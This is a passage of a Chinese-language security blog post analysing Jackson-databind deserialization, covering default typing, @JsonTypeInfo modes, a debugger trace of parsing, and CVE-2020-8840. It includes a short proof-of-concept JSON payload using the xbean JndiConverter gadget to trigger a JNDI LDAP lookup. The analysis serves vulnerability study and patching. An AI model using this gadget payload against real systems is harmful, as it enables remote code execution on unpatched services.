&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age = %d, name = %s, object = %s, sex = %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object, sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">patrilic</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    String sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里我们将第一个patrilic的length值设为1以作区分<br><img src="/Jackson-databind 反序列化漏洞分析/D24B3A95-908D-43FB-B829-095B21304232.png" alt="430f26e2c31cab02f746bd45aba72000"></p>
<h4 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h4><p>顾名思义，除了Final属性之外的所有类都可以被反序列化</p>
<p>这里就不做测试了</p>
<h3 id="Per-class-annotations"><a href="#Per-class-annotations" class="headerlink" title="Per-class annotations"></a>Per-class annotations</h3><p>接下来我们来看看<code>Per-class annotations</code>，简单来说，就是利用注解<code>@JsonTypeInfo</code>去标识，然后控制它的<br><img src="/Jackson-databind 反序列化漏洞分析/885F5F2A-FC7A-418B-B3A4-5179698B2A10.png" alt="08d62db09097323456e38816f46c3738"></p>
<p><code>@JsonTypeInfo</code>一共支持五种注解：</p>
<table>
<thead>
<tr>
<th>JsonTypeInfo</th>
<th>结构</th>
<th>反序列化</th>
</tr>
</thead>
<tbody>
<tr>
<td>@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</td>
<td>{“name”:”JsonTypeInfo”,”age”:100,”obj”:{“h”:100}}</td>
<td>yes</td>
</tr>
<tr>
<td>@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</td>
<td>{“name”:”JsonTypeInfo”,”age”:100,”obj”:{“@class”:”com.patrilic.jackson.Height”,”h”:100}}</td>
<td>yes</td>
</tr>
<tr>
<td>@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</td>
<td>{“name”:”JsonTypeInfo”,”age”:100,”obj”:{“@c”:”com.patrilic.jackson.Height”,”h”:100}}</td>
<td>yes</td>
</tr>
<tr>
<td>@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</td>
<td>{“name”:”JsonTypeInfo”,”age”:100,”obj”:{“@type”:”Height”,”h”:100}}</td>
<td>no</td>
</tr>
<tr>
<td>@JsonTypeInfo(use = JsonTypeInfo.Id.COSTOM)</td>
<td>需要自定义解析器</td>
</tr>
</tbody>
</table>
<p>通过具体代码测试：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jackson;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Jsontypeinfo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectMapper mapper= <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name= <span class="string">"JsonTypeInfo"</span>;</span><br><span class="line">        user.age=<span class="number">100</span>;</span><br><span class="line">        user.obj=<span class="keyword">new</span> Height();</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        String json = mapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        User user1 = mapper.readValue(json, User.class);</span><br><span class="line">        System.out.println(user1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span></span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span></span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)</span></span><br><span class="line">    <span class="keyword">public</span> Object obj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"name = %s, age = %d, obj = %s"</span>, name, age, obj) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Height</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> h = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以在设置为下面三种方式时，可以触发反序列化:</p>
<ul>
<li>enableDefaultTyping()</li>
<li>@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</li>
<li>@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</li>
</ul>
<h2 id="0x04-Jackson解析流程"><a href="#0x04-Jackson解析流程" class="headerlink" title="0x04 Jackson解析流程"></a>0x04 Jackson解析流程</h2><p>测试代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaLangObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        People Q = <span class="keyword">new</span> People();</span><br><span class="line">        Q.age = <span class="number">20</span>;</span><br><span class="line">        Q.name = <span class="string">"com.patrilic.jackson.patrilic"</span>;</span><br><span class="line">        Q.object = <span class="keyword">new</span> patrilic();</span><br><span class="line">        Q.sex = <span class="keyword">new</span> MySex();</span><br><span class="line">        Q.sex.setSex(<span class="number">1</span>);</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        String json = mapper.writeValueAsString(Q);</span><br><span class="line">        System.out.print(json);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        People Q2 = mapper.readValue(json, People.class);</span><br><span class="line">        System.out.println(Q2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age = %d, name = %s, object = %s, sex = %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object, sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">patrilic</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>先在<code>mapper.readValue(json, People.class);</code>处下个断点，简单跟一下发现主要解析流程都是在<code>BeanDeserializer</code>这个类之后</p>
<p>所以直接在<br><code>com/fasterxml/jackson/databind/deser/BeanDeserializer.class#deserialize</code>方法下断点</p>
<p>当解析到<code>this.vanillaDeserialize</code>的时候，先解析<code>p.nextToken()</code><br><img src="/Jackson-databind 反序列化漏洞分析/E63A7F60-21C4-4541-BFC2-EA710997B2EC.png" alt="3b991900e36547799b7a6519153ec5db"></p>
<p>通过解析序列化字符串，将数据和symbol分开，symbol统一入到symbols中<br><img src="/Jackson-databind 反序列化漏洞分析/CF568950-8E6F-44C5-A844-C49BFC3F7DD0.png" alt="04e4c18ba3861c63ff7384ac490cc194"></p>
<p><img src="/Jackson-databind 反序列化漏洞分析/F6C6D22B-F6DA-44A8-AB28-D2E5A50EDE41.png" alt="2425faa16c02d6db3962eeaa533eb90f"></p>
<p>然后跳转到<br><code>com/fasterxml/jackson/databind/deser/std/StdValueInstantiator.class#createUsingDefault</code><br><img src="/Jackson-databind 反序列化漏洞分析/DF1A8B21-47A8-449B-B5C7-28FCC03D758F.png" alt="a52d1bd5e850ceb64b1850f44791cc2f"></p>
<p>通过call()去创建一个实例<br><img src="/Jackson-databind 反序列化漏洞分析/8CBCE7CF-B707-4F5D-8E74-0C3CDF77E48C.png" alt="920ab6628909d54b95265897c5bfa1d6"></p>
<p>之后又回到<code>vanillaDeserialize()</code>方法，<br><img src="/Jackson-databind 反序列化漏洞分析/67E5A09D-7488-4846-9C77-3E998F07756D.png" alt="a876c60a72d5c7a7a2b15ed2a4bc9b41"></p>
<p>经过<code>prop.deserializeAndSet()</code>跳转到<br><code>/com/fasterxml/jackson/databind/deser/impl/FieldProperty.class#deserializeAndSet</code></p>
<p><img src="/Jackson-databind 反序列化漏洞分析/DA71BA40-C8AA-4BB7-8377-AFD15859A45A.png" alt="4cf6eaab1ce504c2554c11d05cd0355b"></p>
<h2 id="0x05-反序列化利用"><a href="#0x05-反序列化利用" class="headerlink" title="0x05 反序列化利用"></a>0x05 反序列化利用</h2><p>Jackson原生框架是没有存在直接漏洞利用的类的，我们需要引入一些外部类去构造Gadget</p>
<h3 id="CVE-2020-8840"><a href="#CVE-2020-8840" class="headerlink" title="CVE-2020-8840"></a>CVE-2020-8840</h3><p>这个CVE利用<code>xbean-reflect</code>利用链造成JNDI注入<br>影响版本：2.0.0 - 2.9.10.2</p>
<p>poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\", &#123;\"asText\":\"ldap://localhost:1389/ExportObject\"&#125;]"</span>;</span><br><span class="line"></span><br><span class="line">        mapper.readValue(json, Object.class);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>跟一下流程：<br>调用mapper.readValue()的时候，<code>return _readMapAndClose</code><br><img src="/Jackson-databind 反序列化漏洞分析/40720CA2-C8AD-4198-A0AD-61289CBC36E9.png" alt="c05706347386ede4181e919ace6d325a"></p>
<p>步入<code>_readMapAndClose</code>，经过读取json，配置<code>DeserializationContext</code>最终到else分支<br><img src="/Jackson-databind 反序列化漏洞分析/B3F3570B-96DF-43D1-8D49-7E57194E1502.png" alt="ac4dbc8c4644763749ec7a6c2a9186ff"><br>调用了<code>deser.deserialize(p, ctxt)</code><br><img src="/Jackson-databind 反序列化漏洞分析/BA7507FB-CC66-4DC9-810B-9CF7E5171568.png" alt="c709959f8631acc164bee8dcede20459"></p>
<p>继续Step Into，直到跟到<br><code>com/fasterxml/jackson/databind/deser/BeanDeserializer.class#deserialize</code><br><img src="/Jackson-databind 反序列化漏洞分析/57595EA2-A6B7-4298-93C9-63DB88A82C62.png" alt="02cf22f01eebbc9eb6c5efc1a68b8b63"></p>
<p>到这里也就是之前熟悉的Jackson反序列化流程了，继续步入到<br><code>com/fasterxml/jackson/databind/deser/BeanDeserializer.class</code><br><img src="/Jackson-databind 反序列化漏洞分析/83FE5795-5FA1-4C45-A107-6D618C6090F1.png" alt="b66482754ac351a5bfa8912b1c08a7c2"></p>
<p><img src="/Jackson-databind 反序列化漏洞分析/8AFA71C5-8F74-414F-BC2F-0A4130100580.png" alt="ff5e08168d379ed16103d4fde8958424"></p>
<p><img src="/Jackson-databind 反序列化漏洞分析/E96D948E-78AF-430D-85BF-DF0ED1FB452E.png" alt="916cb7de4ede46af0aaa58aba79f5a70"><br>通过setter.invoke()执行方法，步入eval类<br><code>org/apache/xbean/propertyeditor/JndiConverter.class</code><br>进行lookup(), 造成JNDI注入<br><img src="/Jackson-databind 反序列化漏洞分析/3B502974-FD08-4576-BA53-DC45A92C11AC.png" alt="3bf785cab194dea07f7782c0295ad7a6"></p>
<p>完整调用链<br><img src="/Jackson-databind 反序列化漏洞分析/32E5A2D0-E691-422D-BB0C-1D471EF1FE86.png" alt="ee9bd51b1a9707adafe242d0e4434ba0"></p>
<p>黑名单类：<br><img src="/Jackson-databind 反序列化漏洞分析/4F2069B1-DD87-4200-BBF4-C47547D60342.png" alt="46b8f5c60d9a14916a00b7cbea24ec30"></p>
<h2 id="0x06-相关链接"><a href="#0x06-相关链接" class="headerlink" title="0x06 相关链接"></a>0x06 相关链接</h2><p><a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/" target="_blank" rel="noopener">https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/</a><br><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/" target="_blank" rel="noopener">https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/</a><br><a href="http://www.lmxspace.com/2019/07/30/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB" target="_blank" rel="noopener">http://www.lmxspace.com/2019/07/30/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB</a><br><a href="https://www.anquanke.com/post/id/199460" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199460</a><br><a href="https://www.ibm.com/developerworks/cn/java/jackson-advanced-application/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/java/jackson-advanced-application/index.html</a><br><a href="https://github.com/FasterXML/jackson-databind" target="_blank" rel="noopener">https://github.com/FasterXML/jackson-databind</a><br><a href="https://github.com/FasterXML/jackson-databind/issues/2620" target="_blank" rel="noopener">https://github.com/FasterXML/jackson-databind/issues/2620</a></p>
</div><div class="tags"><a href="/tags/Jackson/">Jackson</a></div><div class="post-nav"><a class="pre" href="/2020/03/25/Tomcat-Ajp协议漏洞分析(CVE-2020-1938)/">Tomcat-Ajp协议漏洞分析(CVE-2020-1938)</a><a class="next" href="/2020/03/19/commons-collections-3.1 反序列化分析/">commons-collections-3.1 反序列化分析</a></div><div id="disqus_thread"><div class="btn_click_load"><button class="disqus_click_btn">阅读评论（请确保 Disqus 可以正常加载）</button></div><script type="text/javascript">var disqus_config = function () {
    this.page.url = 'http://patrilic.top/2020/03/24/Jackson-databind 反序列化漏洞分析 (CVE-2020-8840)/';
    this.page.identifier = '2020/03/24/Jackson-databind 反序列化漏洞分析 (CVE-2020-8840)/';
    this.page.title = 'Jackson-databind 反序列化漏洞分析 (CVE-2020-8840)';
  };</script><script type="text/javascript" id="disqus-lazy-load-script">$.ajax({
url: 'https://disqus.com/next/config.json',
timeout: 2500,
type: 'GET',
success: function(){
  var d = document;
  var s = d.createElement('script');
  s.src = '//Patrilic.disqus.com/embed.js';
  s.setAttribute('data-timestamp', + new Date());
  (d.head || d.body).appendChild(s);
  $('.disqus_click_btn').css('display', 'none');
},
error: function() {
  $('.disqus_click_btn').css('display', 'block');
}
});</script><script type="text/javascript" id="disqus-click-load">$('.btn_click_load').click(() => {  //click to load comments
    (() => { // DON'T EDIT BELOW THIS LINE
        var d = document;
        var s = d.createElement('script');
        s.src = '//Patrilic.disqus.com/embed.js';
        s.setAttribute('data-timestamp', + new Date());
        (d.head || d.body).appendChild(s);
    })();
    $('.disqus_click_btn').css('display','none');
});</script><script type="text/javascript" id="disqus-count-script">$(function() {
     var xhr = new XMLHttpRequest();
     xhr.open('GET', '//disqus.com/next/config.json', true);
     xhr.timeout = 2500;
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         $('.post-meta .post-comments-count').show();
         var s = document.createElement('script');
         s.id = 'dsq-count-scr';
         s.src = 'https://Patrilic.disqus.com/count.js';
         s.async = true;
         (document.head || document.body).appendChild(s);
       }
     };
     xhr.ontimeout = function () { xhr.abort(); };
     xhr.send(null);
   });
</script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://patrilic.top"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ATT-CK/">ATT&CK</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/BypassUac/">BypassUac</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Diary/">Diary</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java-Sec/">Java_Sec</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pentest-Cheat-Sheet/">Pentest Cheat Sheet</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Red-Team-Tricks/">Red-Team Tricks</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQLi-Tricks/">SQLi Tricks</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Skills/">Skills</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Threat-Intelligence/">Threat Intelligence</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Write-up/">Write-up</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/">漏洞复现</a><span class="category-list-count">8</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Ghost-cat/" style="font-size: 15px;">Ghost_cat</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/BlueKeep/" style="font-size: 15px;">BlueKeep</a> <a href="/tags/Backdoor/" style="font-size: 15px;">Backdoor</a> <a href="/tags/Forcepoint-VPN/" style="font-size: 15px;">Forcepoint VPN</a> <a href="/tags/Windows提权/" style="font-size: 15px;">Windows提权</a> <a href="/tags/DLL-Hijacking/" style="font-size: 15px;">DLL Hijacking</a> <a href="/tags/FastJson/" style="font-size: 15px;">FastJson</a> <a href="/tags/Potato/" style="font-size: 15px;">Potato</a> <a href="/tags/JNDI/" style="font-size: 15px;">JNDI</a> <a href="/tags/Java反射/" style="font-size: 15px;">Java反射</a> <a href="/tags/代码审计/" style="font-size: 15px;">代码审计</a> <a href="/tags/n1ctf-pentest/" style="font-size: 15px;">n1ctf-pentest</a> <a href="/tags/metasploit/" style="font-size: 15px;">metasploit</a> <a href="/tags/SQLi/" style="font-size: 15px;">SQLi</a> <a href="/tags/Bypass-CDN/" style="font-size: 15px;">Bypass CDN</a> <a href="/tags/内网渗透/" style="font-size: 15px;">内网渗透</a> <a href="/tags/iSoonLab-org/" style="font-size: 15px;">iSoonLab.org</a> <a href="/tags/proc/" style="font-size: 15px;">proc</a> <a href="/tags/ClassLoader/" style="font-size: 15px;">ClassLoader</a> <a href="/tags/反序列化/" style="font-size: 15px;">反序列化</a> <a href="/tags/SQL注入/" style="font-size: 15px;">SQL注入</a> <a href="/tags/RMI/" style="font-size: 15px;">RMI</a> <a href="/tags/Struts2/" style="font-size: 15px;">Struts2</a> <a href="/tags/Commons-Collections/" style="font-size: 15px;">Commons-Collections</a> <a href="/tags/Jackson/" style="font-size: 15px;">Jackson</a> <a href="/tags/文件上传/" style="font-size: 15px;">文件上传</a> <a href="/tags/Git/" style="font-size: 15px;">Git</a> <a href="/tags/威胁情报/" style="font-size: 15px;">威胁情报</a> <a href="/tags/DotNet/" style="font-size: 15px;">DotNet</a> <a href="/tags/命令执行/" style="font-size: 15px;">命令执行</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://balis0ng.com" title="balis0ng" target="_blank">balis0ng</a><ul></ul><a href="https://evi1cg.me/" title="evi1cg's Blog" target="_blank">evi1cg's Blog</a><ul></ul><a href="http://hpdoger.cn" title="Hpdoger" target="_blank">Hpdoger</a><ul></ul><a href="http://0day.design" title="Passer6y" target="_blank">Passer6y</a><ul></ul><a href="http://adm1n.design" title="Hu3sky" target="_blank">Hu3sky</a><ul></ul><a href="http://0xa1paca.top" title="0xa1paca" target="_blank">0xa1paca</a><ul></ul><a href="http://noel.xin/" title="Noel's Blog" target="_blank">Noel's Blog</a><ul></ul><a href="https://www.0akarma.com" title="0aKarmA" target="_blank">0aKarmA</a><ul></ul><a href="https://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a><ul></ul><a href="https://www.kingkk.com/" title="Kingkk's Blog" target="_blank">Kingkk's Blog</a><ul></ul><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a><ul></ul><a href="http://r3start.net/" title="R3start" target="_blank">R3start</a><ul></ul><a href="https://zgao.top" title="zgao" target="_blank">zgao</a><ul></ul><a href="https://b1eed.github.io/" title="1x2Bytes" target="_blank">1x2Bytes</a><ul></ul><a href="http://www.free04k.cn/" title="free04k" target="_blank">free04k</a><ul></ul><a href="http://hl0rey.github.io/" title="hl0rey" target="_blank">hl0rey</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">Patrilic's blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" 